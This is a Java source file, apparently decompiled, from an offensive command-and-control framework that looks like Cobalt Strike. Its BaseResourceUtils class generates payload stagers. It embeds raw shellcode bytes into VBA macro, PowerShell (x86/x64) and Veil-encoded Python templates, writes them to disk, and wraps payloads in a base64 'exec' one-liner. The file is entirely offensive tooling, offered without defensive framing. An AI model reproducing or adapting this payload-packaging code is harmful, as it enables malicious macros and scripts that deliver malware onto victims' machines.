package common;

import aggressor.AggressorClient;
import encoders.Base64;
import encoders.Transforms;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.Stack;
import sleep.runtime.SleepUtils;

public abstract class BaseResourceUtils {
   protected AggressorClient client;

   public BaseResourceUtils(AggressorClient var1) {
      this.client = var1;
   }

   public byte[] getScriptedResource(String var1, byte[] var2, byte[] var3) {
      Stack var4 = new Stack();
      var4.push(SleepUtils.getScalar(var3));
      var4.push(SleepUtils.getScalar(var2));
      var4.push(SleepUtils.getScalar(var1));
      String var5 = this.client.getScriptEngine().format("RESOURCE_GENERATOR", var4);
      return var5 == null ? new byte[0] : CommonUtils.toBytes(var5);
   }

   public byte[] buildPython(byte[] var1, byte[] var2) {
      byte[] var3 = this.getScriptedResource("template.py", var1, var2);
      return var3.length == 0 ? _buildPython(var1, var2) : var3;
   }

   public byte[] buildMacro(byte[] var1) {
      byte[] var2 = this.getScriptedResource("template.x86.vba", var1, new byte[0]);
      return var2.length == 0 ? this._buildMacro(var1) : var2;
   }

   public byte[] buildPowerShell(byte[] var1, boolean var2) {
      byte[] var3 = new byte[0];
      if (var2) {
         var3 = this.getScriptedResource("template.x64.ps1", new byte[0], var1);
      } else {
         var3 = this.getScriptedResource("template.x86.ps1", var1, new byte[0]);
      }

      return var3.length == 0 ? this._buildPowerShell(var1, var2) : var3;
   }

   public byte[] buildPowerShell(byte[] var1) {
      return this.buildPowerShell(var1, false);
   }

   public void buildPowerShell(byte[] var1, String var2) {
      this.buildPowerShell(var1, var2, false);
   }

   public void buildPowerShell(byte[] var1, String var2, boolean var3) {
      byte[] var4 = this.buildPowerShell(var1, var3);
      CommonUtils.writeToFile(new File(var2), var4);
   }

   public abstract byte[] _buildPowerShell(byte[] var1, boolean var2);

   public byte[] _buildMacro(byte[] var1) {
      String var2 = CommonUtils.bString(CommonUtils.readResource("resources/template.x86.vba"));
      String var3 = "myArray = " + Transforms.toVBA(var1);
      var2 = CommonUtils.strrep(var2, "$PAYLOAD$", var3);
      return CommonUtils.toBytes(var2);
   }

   public static byte[] _buildPython(byte[] var0, byte[] var1) {
      try {
         InputStream var2 = CommonUtils.resource("resources/template.py");
         byte[] var3 = CommonUtils.readAll(var2);
         var2.close();
         String var4 = CommonUtils.bString(var3);
         var4 = CommonUtils.strrep(var4, "$$CODE32$$", CommonUtils.bString(Transforms.toVeil(var0)));
         var4 = CommonUtils.strrep(var4, "$$CODE64$$", CommonUtils.bString(Transforms.toVeil(var1)));
         return CommonUtils.toBytes(var4);
      } catch (IOException var5) {
         MudgeSanity.logException("buildPython", var5, false);
         return new byte[0];
      }
   }

   public String PythonCompress(byte[] var1) {
      Stack var2 = new Stack();
      var2.push(SleepUtils.getScalar(var1));
      String var3 = this.client.getScriptEngine().format("PYTHON_COMPRESS", var2);
      return var3 == null ? "import base64; exec base64.b64decode(\"" + Base64.encode(var1) + "\")" : var3;
   }
}
